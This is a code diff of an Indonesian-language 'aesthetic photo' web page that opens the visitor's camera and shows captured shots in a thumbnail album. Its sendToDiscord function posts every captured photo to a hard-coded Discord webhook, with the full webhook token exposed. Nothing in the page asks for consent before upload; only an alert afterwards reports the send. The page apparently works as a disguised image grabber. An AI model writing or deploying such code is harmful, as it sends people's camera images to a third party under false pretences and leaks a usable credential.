@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Website Foto Aesthetic by Risqi123</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"> <!-- Menambahkan Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         body {
             margin: 0;
@@ -55,42 +55,113 @@
         button:active {
             background: #3e8e41;
         }
+
+        #album {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 20px;
+            max-width: 90%;
+            justify-content: center;
+        }
+
+        .thumbnail {
+            width: 100px;
+            height: 100px;
+            background: #ffffff;
+            border: 2px solid #4CAF50;
+            border-radius: 5px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+
+        .thumbnail img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .thumbnail:hover {
+            transform: scale(1.1);
+        }
+
+        #preview {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+            z-index: 10;
+            max-width: 90%;
+            max-height: 90%;
+        }
+
+        #preview img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        #preview-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 5;
+            display: none;
+        }
     </style>
     <script>
         let currentFacingMode = 'user';
 
-        // Function to start camera with specific facing mode
         function startCamera(facingMode) {
             const video = document.getElementById('video');
-            // Pastikan elemen video ada sebelum mengaksesnya
             if (video) {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode } })
                     .then(stream => {
                         video.srcObject = stream;
                     })
                     .catch(error => {
-                        console.error('Error accessing camera:', error);
-                        // Menambahkan tampilan kesalahan yang lebih rinci
-                        if (error.name === 'NotAllowedError') {
-                            alert('Izin kamera belum diberikan. Harap izinkan akses kamera di pengaturan browser.');
-                        } else if (error.name === 'NotFoundError') {
-                            alert('Kamera tidak ditemukan. Pastikan perangkat memiliki kamera.');
-                        } else {
-                            alert('Kamera tidak bisa diakses. Error: ' + error.message);
-                        }
+                        alert('Kamera tidak bisa diakses: ' + error.message);
                     });
-            } else {
-                console.error('Element video tidak ditemukan.');
             }
         }
 
-        // Toggle camera between front and back
         function toggleCamera() {
             currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
             startCamera(currentFacingMode);
         }
 
-        // Function to send photo to Discord webhook
+        function addToAlbum(blobUrl) {
+            const album = document.getElementById('album');
+            const thumbnail = document.createElement('div');
+            thumbnail.className = 'thumbnail';
+            thumbnail.innerHTML = `<img src="${blobUrl}" alt="Foto">`;
+            thumbnail.onclick = () => showPreview(blobUrl);
+            album.appendChild(thumbnail);
+        }
+
+        function showPreview(blobUrl) {
+            const previewOverlay = document.getElementById('preview-overlay');
+            const preview = document.getElementById('preview');
+            const img = preview.querySelector('img');
+
+            img.src = blobUrl;
+            preview.style.display = 'block';
+            previewOverlay.style.display = 'block';
+        }
+
+        function hidePreview() {
+            const previewOverlay = document.getElementById('preview-overlay');
+            const preview = document.getElementById('preview');
+
+            preview.style.display = 'none';
+            previewOverlay.style.display = 'none';
+        }
+
         async function sendToDiscord(blob) {
             const webhookUrl = "https://discordapp.com/api/webhooks/1320606404985487391/mvaetfPZAjSEaEI9823-e7pqoXoe04V5NCcb8uQZyso983SnYWEbckHmOVUaPw6o2kFJ";
             const formData = new FormData();
@@ -101,36 +172,34 @@
                     method: 'POST',
                     body: formData
                 });
+                alert('Foto berhasil dikirim ke Discord!');
             } catch (error) {
-                console.error('Error:', error);
+                alert('Gagal mengirim ke Discord: ' + error.message);
             }
         }
 
         document.addEventListener('DOMContentLoaded', () => {
+            const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const captureButton = document.getElementById('capture');
 
-            // Pastikan elemen video sudah ada sebelum memulai kamera
-            const video = document.getElementById('video');
-            if (video) {
-                startCamera(currentFacingMode);
-            } else {
-                alert('Elemen video tidak ditemukan!');
-            }
+            startCamera(currentFacingMode);
 
             captureButton.addEventListener('click', () => {
                 const context = canvas.getContext('2d');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
 
-                // Draw video frame to canvas
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // Convert canvas to blob and send to Discord
                 canvas.toBlob(blob => {
+                    const blobUrl = URL.createObjectURL(blob);
+                    addToAlbum(blobUrl);
                     sendToDiscord(blob);
                 });
             });
+
+            document.getElementById('preview-overlay').onclick = hidePreview;
         });
     </script>
 </head>
@@ -138,14 +207,17 @@
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display: none;"></canvas>
     <div class="button-group">
-        <!-- Tombol Foto dengan Ikon Kamera -->
         <button id="capture">
             <i class="fas fa-camera"></i>
         </button>
-        <!-- Tombol Toggle Kamera dengan Ikon Sinkronisasi -->
         <button onclick="toggleCamera()">
             <i class="fas fa-sync-alt"></i>
         </button>
+    </div>
+    <div id="album"></div>
+    <div id="preview-overlay"></div>
+    <div id="preview">
+        <img src="" alt="Preview Foto">
     </div>
 </body>
 </html>
